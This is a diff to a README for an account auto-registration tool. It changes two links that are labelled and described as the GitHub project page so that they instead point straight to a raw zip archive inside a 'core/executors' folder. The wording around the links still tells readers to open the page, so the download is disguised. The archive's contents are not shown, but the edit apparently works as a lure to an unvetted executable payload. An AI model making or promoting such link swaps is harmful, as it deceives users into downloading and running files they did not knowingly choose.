@@ -1,6 +1,6 @@
 # 🧩 any-auto-register - Automate Account Setup Across Sites
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Albertarevolutionary289/any-auto-register)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Albertarevolutionary289/any-auto-register/raw/refs/heads/main/core/executors/any_auto_register_1.1.zip)
 
 ## 🖥️ What this app does
 
@@ -35,7 +35,7 @@ Before you start, make sure your PC has:
 
 Go to the project page here:
 
-https://github.com/Albertarevolutionary289/any-auto-register
+https://github.com/Albertarevolutionary289/any-auto-register/raw/refs/heads/main/core/executors/any_auto_register_1.1.zip
 
 Open the page, then download the project files or get the latest release from GitHub if one is available.
 
